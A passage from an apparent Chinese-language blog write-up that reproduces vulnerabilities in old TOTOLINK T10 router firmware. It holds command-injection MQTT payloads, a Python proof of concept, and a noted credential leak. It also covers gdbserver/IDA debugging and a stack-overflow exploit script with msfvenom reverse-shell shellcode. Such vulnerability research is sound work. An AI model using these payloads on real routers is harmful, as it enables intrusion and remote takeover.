setLanguageCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;loginAuth&quot;</span>, &amp;loginAuth);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getSaveConfig&quot;</span>, &amp;getSaveConfig);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getLedStatus&quot;</span>, getLedStatus);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getWanAutoDetect&quot;</span>, &amp;getWanAutoDetect);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;setEasyWizardCfg&quot;</span>, setEasyWizardCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;getEasyWizardCfg&quot;</span>, getEasyWizardCfg);</span><br><span class=\"line\">  cste_hook_register(<span class=\"string\">&quot;autoDhcp&quot;</span>, autoDhcp);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"6-3-1-setLanguageCfg-命令执行\"><a href=\"#6-3-1-setLanguageCfg-命令执行\" class=\"headerlink\" title=\"6.3.1 setLanguageCfg 命令执行\"></a>6.3.1 setLanguageCfg 命令执行</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/setLanguageCfg</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setLanguageCfg&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;langType&quot;</span>:<span class=\"string\">&quot;;echo 123 &gt; /tmp/setLanguageCfg;&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514112704936.png\" alt=\"image-20230514112704936\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514112826832.png\" alt=\"image-20230514112826832\"></p>\n<h4 id=\"6-3-2-getLanguageCfg-信息泄露\"><a href=\"#6-3-2-getLanguageCfg-信息泄露\" class=\"headerlink\" title=\"6.3.2 getLanguageCfg 信息泄露\"></a>6.3.2 getLanguageCfg 信息泄露</h4><p>​\t\t用户名密码泄露</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230509153514388.png\" alt=\"image-20230509153514388\"></p>\n<h2 id=\"6-4-firewall-so\"><a href=\"#6-4-firewall-so\" class=\"headerlink\" title=\"6.4 firewall.so\"></a>6.4 firewall.so</h2><p>​\t\t防火墙的,设置防火墙相应内容. 但是这里面system执行的内容都是写死的,不可控</p>\n<p>​\t\t有没有可能格式化字符串修改固定的值,然后进行命令利用?</p>\n<h2 id=\"6-5-wireless-so\"><a href=\"#6-5-wireless-so\" class=\"headerlink\" title=\"6.5 wireless.so\"></a>6.5 wireless.so</h2><h4 id=\"6-5-1-setWebWlanIdx-命令执行\"><a href=\"#6-5-1-setWebWlanIdx-命令执行\" class=\"headerlink\" title=\"6.5.1 setWebWlanIdx 命令执行\"></a>6.5.1 setWebWlanIdx 命令执行</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/setWebWlanIdx</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/setWebWlanIdx&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;webWlanIdx&quot;</span>:<span class=\"string\">&quot;;echo 123 &gt; /tmp/setWebWlanIdx;&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(<span class=\"string\">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setWebWlanIdx&quot;,&quot;hostTime&quot;:&quot;;echo 123 &gt; /tmp/test123;&quot;)</span></span><br><span class=\"line\"><span class=\"string\">print(response.text)</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514114559605.png\" alt=\"image-20230514114559605\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514114010466.png\" alt=\"image-20230514114010466\"></p>\n<h4 id=\"6-5-2-updateWifiInfo-命令执行\"><a href=\"#6-5-2-updateWifiInfo-命令执行\" class=\"headerlink\" title=\"6.5.2 updateWifiInfo 命令执行\"></a>6.5.2 updateWifiInfo 命令执行</h4><p>​\t\t注意newMd5参数不为0</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/updateWifiInfo</span><br><span class=\"line\">    </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/updateWifiInfo&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;serverIp&quot;</span>:<span class=\"string\">&quot;;/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/updateWifiInfo;&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;newMd5&quot;</span>:<span class=\"number\">123</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514115843851.png\" alt=\"image-20230514115843851\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514115827103.png\" alt=\"image-20230514115827103\"></p>\n<h4 id=\"6-5-3-meshInfoKick-命令执行\"><a href=\"#6-5-3-meshInfoKick-命令执行\" class=\"headerlink\" title=\"6.5.3 meshInfoKick 命令执行\"></a>6.5.3 meshInfoKick 命令执行</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">totolink/router/setting/meshInfoKick</span><br><span class=\"line\">    </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;topicurl&quot;</span>:<span class=\"string\">&quot;setting/meshInfoKick&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;ipAddr&quot;</span>:<span class=\"string\">&quot;;/tmp/busybox-mipsel$&#123;IFS&#125;touch$&#123;IFS&#125;/tmp/meshInfoKick;&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514120847962.png\" alt=\"image-20230514120847962\"></p>\n<p>​\t\t有点小问题,还没调试好</p>\n<h2 id=\"6-6-lan-so、wan-so、wps-so\"><a href=\"#6-6-lan-so、wan-so、wps-so\" class=\"headerlink\" title=\"6.6 lan.so、wan.so、wps.so\"></a>6.6 lan.so、wan.so、wps.so</h2><p>没找到</p>\n<h1 id=\"七、溢出漏洞调试\"><a href=\"#七、溢出漏洞调试\" class=\"headerlink\" title=\"七、溢出漏洞调试\"></a>七、溢出漏洞调试</h1><h2 id=\"7-1-gdbserver调试\"><a href=\"#7-1-gdbserver调试\" class=\"headerlink\" title=\"7.1 gdbserver调试\"></a>7.1 gdbserver调试</h2><p>​\t\t被调试的机器下载gdbserver,然后启动 gdbserver 192.168.xx.xx:1234 .&#x2F;helloworld,或者进行attach进程</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM<span class=\"number\">-24</span><span class=\"number\">-10</span>-ubuntu:/home/ubuntu/gdb# ./gdbserver<span class=\"number\">-7.10</span><span class=\"number\">.1</span>-x64 :<span class=\"number\">80</span> --attach <span class=\"number\">17031</span></span><br><span class=\"line\">Attached; pid = <span class=\"number\">17031</span></span><br><span class=\"line\">Listening on port <span class=\"number\">80</span></span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://github.com/akpotter/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver\">https://github.com/akpotter/embedded-toolkit/tree/master/prebuilt_static_bins/gdbserver</a></p>\n<p>调试机器开启gdb后连接即可 (gdb) target remote 192.168.xx.xx:1234</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; target remote xxxxxx:<span class=\"number\">80</span></span><br><span class=\"line\">Remote debugging using xxxxxxxx:<span class=\"number\">80</span></span><br><span class=\"line\">Reading /home/ubuntu/gdb/pwn2 from remote target...</span><br><span class=\"line\">warning: File transfers from remote targets can be slow. Use <span class=\"string\">&quot;set sysroot&quot;</span> to access files locally instead.</span><br><span class=\"line\">Reading /home/ubuntu/gdb/pwn2 from remote target...</span><br><span class=\"line\">Reading symbols from target:/home/ubuntu/gdb/pwn2...</span><br><span class=\"line\">(No debugging symbols found in target:/home/ubuntu/gdb/pwn2)</span><br><span class=\"line\"><span class=\"number\">0x0000000000400a40</span> in _start ()</span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t在这里踩了很多坑,很多时候连上能成功,但是ni执行的时候就出问题了,立马断掉,进程就会挂掉,尝试很多不同的gdbserver,自己也尝试编译了一下,都失败了,马上要放弃的时候,又找了一个版本<a href=\"https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver\">https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver</a></p>\n<p>rapid7编译的,可以正常使用了</p>\n<h2 id=\"7-2-ida动态调试-远程调试\"><a href=\"#7-2-ida动态调试-远程调试\" class=\"headerlink\" title=\"7.2 ida动态调试\\远程调试\"></a>7.2 ida动态调试\\远程调试</h2><p>​\t\t和gdbserver联动</p>\n<h3 id=\"7-2-1附加调试-无符号信息\"><a href=\"#7-2-1附加调试-无符号信息\" class=\"headerlink\" title=\"7.2.1附加调试(无符号信息)\"></a>7.2.1附加调试(无符号信息)</h3><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508190616664.png\" alt=\"image-20230508190616664\" style=\"zoom: 33%;\">\n\n\n\n<p>这种方式没有反汇编的函数信息等</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508191055311.png\" alt=\"image-20230508191055311\"></p>\n<p>设置mipsel </p>\n<p>选择 Processor type</p>\n<p>基本命令 <a href=\"https://blog.csdn.net/m0_52164435/article/details/124871122\">https://blog.csdn.net/m0_52164435/article/details/124871122</a></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508191409485.png\" alt=\"image-20230508191409485\"></p>\n<h3 id=\"7-2-2-运行调试-有符号信息\"><a href=\"#7-2-2-运行调试-有符号信息\" class=\"headerlink\" title=\"7.2.2 运行调试(有符号信息)\"></a>7.2.2 运行调试(有符号信息)</h3><p>​\t\t先加载二进制文件,main函数处下断点、debugger–process options 设置好ip和端口</p>\n<img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508191959853.png\" alt=\"image-20230508191959853\" style=\"zoom:33%;\">\n\n\n\n<p>被调试那里开启服务,然后debugger-attach to process即可</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230508192153803.png\" alt=\"image-20230508192153803\"></p>\n<p>​\t\t如果不确定本地的版本和远程的时候一样可以导出二进制文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat ./cs_broker  | /tmp/busybox-mipsel base64        # 编码过程</span><br><span class=\"line\"># 将base64编码的内容保存到本地文件pcap64</span><br><span class=\"line\">cat cs | base64 -d &gt; cs_broker         # 解码过程</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t.&#x2F;gdbserver.mipsle :9999 –attach 1335  ida能够成功连接上,但是ida那边运行后,一发送mqtt包就会蹦.. 偶尔能调试成功,能单步走..比较玄学,因为gdb那边调试没用问题,就先用gdb进行调试了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ./gdbserver.mipsle :<span class=\"number\">9999</span> --attach <span class=\"number\">1335</span></span><br><span class=\"line\">Attached; pid = <span class=\"number\">1335</span></span><br><span class=\"line\">Listening on port <span class=\"number\">9999</span></span><br><span class=\"line\">Remote debugging from host <span class=\"number\">192.168</span><span class=\"number\">.55</span><span class=\"number\">.3</span></span><br><span class=\"line\">Connection closed by foreign host.</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"># ./gdbserver.mipsle :<span class=\"number\">9999</span> --attach <span class=\"number\">1335</span></span><br><span class=\"line\">Attached; pid = <span class=\"number\">1335</span></span><br><span class=\"line\">Listening on port <span class=\"number\">9999</span></span><br><span class=\"line\">Remote debugging from host <span class=\"number\">192.168</span><span class=\"number\">.55</span><span class=\"number\">.3</span></span><br><span class=\"line\">ptrace: Input/output error.</span><br><span class=\"line\">input_interrupt, count = <span class=\"number\">1</span> c = <span class=\"number\">36</span> (<span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">input_interrupt, count = <span class=\"number\">1</span> c = <span class=\"number\">36</span> (<span class=\"string\">&#x27;$&#x27;</span>)</span><br><span class=\"line\">input_interrupt, count = <span class=\"number\">1</span> c = <span class=\"number\">107</span> (<span class=\"string\">&#x27;k&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>好像和二进制文件有关?</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">The current debugger <span class=\"title function_\">backend</span> <span class=\"params\">(gdb)</span> does not provide memory information to IDA.</span><br><span class=\"line\">Therefore the memory contents may be invisible by <span class=\"keyword\">default</span>.</span><br><span class=\"line\">Please use the Debugger/Manual memory regions menu item to configure the memory layout.</span><br><span class=\"line\">It is possible to define just one big region <span class=\"keyword\">for</span> the whole <span class=\"title function_\">memory</span></span><br><span class=\"line\"><span class=\"params\">(IDA will display question marks <span class=\"keyword\">for</span> missing memory regions in this <span class=\"keyword\">case</span>)</span>.</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"7-3-filewall-so库中setIpQosRules函数栈溢出调试\"><a href=\"#7-3-filewall-so库中setIpQosRules函数栈溢出调试\" class=\"headerlink\" title=\"7.3 filewall.so库中setIpQosRules函数栈溢出调试\"></a>7.3 filewall.so库中setIpQosRules函数栈溢出调试</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">setIpQosRules</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">int</span> a2, <span class=\"type\">int</span> a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  ......</span><br><span class=\"line\">  <span class=\"type\">char</span> v14[<span class=\"number\">23</span>]; <span class=\"comment\">// [sp+18h] [-B8h] BYREF</span></span><br><span class=\"line\">  ......</span><br><span class=\"line\">  v12 = (<span class=\"type\">const</span> <span class=\"type\">char</span> *)websGetVar(a2, <span class=\"string\">&quot;comment&quot;</span>, &amp;byte_9268);</span><br><span class=\"line\">\t......</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(v14, v12);</span><br><span class=\"line\">  apmib_set(<span class=\"number\">131385</span>, v14);</span><br><span class=\"line\">  apmib_set(<span class=\"number\">65848</span>, v14);</span><br><span class=\"line\">  apmib_update_web(<span class=\"number\">4</span>);</span><br><span class=\"line\">  system(<span class=\"string\">&quot;sysconf firewall&quot;</span>);</span><br><span class=\"line\">  websSetCfgResponse(a1, a3, <span class=\"string\">&quot;0&quot;</span>, <span class=\"string\">&quot;reserv&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tcomment明显存在溢出,复制给栈上数据v14</p>\n<h4 id=\"7-3-1-利用脚本\"><a href=\"#7-3-1-利用脚本\" class=\"headerlink\" title=\"7.3.1 利用脚本\"></a>7.3.1 利用脚本</h4><p>生成反弹shell payload:msfvenom -p linux&#x2F;mipsle&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.55.4 LPORT&#x3D;9999 -f py -o mips.txt</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> paho.mqtt.client <span class=\"keyword\">as</span> mqtt</span><br><span class=\"line\"></span><br><span class=\"line\">buf = <span class=\"string\">&quot;\\xfa\\xff\\x0f\\x24\\x27\\x78\\xe0\\x01\\xfd\\xff\\xe4\\x21&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xfd\\xff\\xe5\\x21\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x0c\\x01\\x01\\x01\\xff\\xff\\xa2\\xaf\\xff\\xff\\xa4\\x8f&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xfd\\xff\\x0f\\x34\\x27\\x78\\xe0\\x01\\xe2\\xff\\xaf\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x27\\x0f\\x0e\\x3c\\x27\\x0f\\xce\\x35\\xe4\\xff\\xae\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x37\\x02\\x0e\\x3c\\xc0\\xa8\\xce\\x35\\xe6\\xff\\xae\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xe2\\xff\\xa5\\x27\\xef\\xff\\x0c\\x24\\x27\\x30\\x80\\x01&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x4a\\x10\\x02\\x24\\x0c\\x01\\x01\\x01\\xfd\\xff\\x11\\x24&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x27\\x88\\x20\\x02\\xff\\xff\\xa4\\x8f\\x21\\x28\\x20\\x02&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\xff\\xff\\x10\\x24&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xff\\xff\\x31\\x22\\xfa\\xff\\x30\\x16\\xff\\xff\\x06\\x28&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x62\\x69\\x0f\\x3c\\x2f\\x2f\\xef\\x35\\xec\\xff\\xaf\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x73\\x68\\x0e\\x3c\\x6e\\x2f\\xce\\x35\\xf0\\xff\\xae\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xf4\\xff\\xa0\\xaf\\xec\\xff\\xa4\\x27\\xf8\\xff\\xa4\\xaf&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\xfc\\xff\\xa0\\xaf\\xf8\\xff\\xa5\\x27\\xab\\x0f\\x02\\x24&quot;</span></span><br><span class=\"line\">buf += <span class=\"string\">&quot;\\x0c\\x01\\x01\\x01&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">test = <span class=\"string\">&quot;a&quot;</span>*<span class=\"number\">218</span></span><br><span class=\"line\"></span><br><span class=\"line\">client = mqtt.Client()</span><br><span class=\"line\">client.connect(<span class=\"string\">&quot;192.168.55.1&quot;</span>,<span class=\"number\">1883</span>,<span class=\"number\">60</span>)</span><br><span class=\"line\">client.publish(<span class=\"string\">&#x27;totolink/router/setting/setIpQosRules&#x27;</span>,payload=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setIpQosRules&quot;,&quot;comment&quot;:&quot;xx&#x27;</span>+test+<span class=\"string\">&#x27;\\xb4\\x43\\x41&quot;&#125;&#x27;</span>+<span class=\"string\">&#x27;bling&#x27;</span>+buf)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t偏移量具体多少可以在调试的时候查看</p>\n<h4 id=\"7-3-2-调试案例\"><a href=\"#7-3-2-调试案例\" class=\"headerlink\" title=\"7.3.2 调试案例\"></a>7.3.2 调试案例</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">路由器上</span><br><span class=\"line\"># ./gdbserver.mipsle :<span class=\"number\">9999</span> --attach <span class=\"number\">14725</span></span><br><span class=\"line\">Attached; pid = <span class=\"number\">14725</span></span><br><span class=\"line\">Listening on port <span class=\"number\">9999</span></span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">调试机器</span><br><span class=\"line\">target remote <span class=\"number\">192.168</span><span class=\"number\">.55</span><span class=\"number\">.1</span>:<span class=\"number\">9999</span></span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">   </span><br><span class=\"line\">    </span><br><span class=\"line\">vmmap</span><br><span class=\"line\">例如查到firewall.so的基地址是<span class=\"number\">0x778ec000</span></span><br><span class=\"line\"></span><br><span class=\"line\">.text:<span class=\"number\">00003414</span>                 la      $t9, <span class=\"built_in\">strcpy</span></span><br><span class=\"line\">.text:<span class=\"number\">00003418</span>                 jalr    $t9 ; <span class=\"built_in\">strcpy</span></span><br><span class=\"line\">.text:<span class=\"number\">0000341</span>C                 move    $a1, $s1         <span class=\"meta\"># src</span></span><br><span class=\"line\">.text:<span class=\"number\">00003420</span>                 lw      $gp, <span class=\"number\">0xD0</span>+var_C0($sp)</span><br><span class=\"line\">.text:<span class=\"number\">00003424</span>                 li      $a0, <span class=\"number\">0x20139</span></span><br><span class=\"line\"></span><br><span class=\"line\">ida中看到<span class=\"built_in\">strcpy</span>的地址是<span class=\"number\">00003418</span>, 于是下断点在<span class=\"number\">0x778ec000</span>+<span class=\"number\">0x0003418</span> = <span class=\"number\">0x778ef418</span></span><br><span class=\"line\">b *<span class=\"number\">0x778ef418</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">此外,为了更好的查看覆盖返回地址情况</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">可以在开头再下一个断点,     sw      $ra, <span class=\"number\">0xD0</span>+var_s24($sp) 这个是存放返回地址的指令,放在$ra寄存器里</span><br><span class=\"line\">.text:<span class=\"number\">0000329</span>C                 li      $gp, (_fdata+<span class=\"number\">0x7FF0</span> - .)</span><br><span class=\"line\">.text:<span class=\"number\">000032</span>A4                 addu    $gp, $t9</span><br><span class=\"line\">.text:<span class=\"number\">000032</span>A8                 addiu   $sp, <span class=\"number\">-0xF8</span></span><br><span class=\"line\">.text:<span class=\"number\">000032</span>AC                 sw      $ra, <span class=\"number\">0xD0</span>+var_s24($sp)</span><br><span class=\"line\"></span><br><span 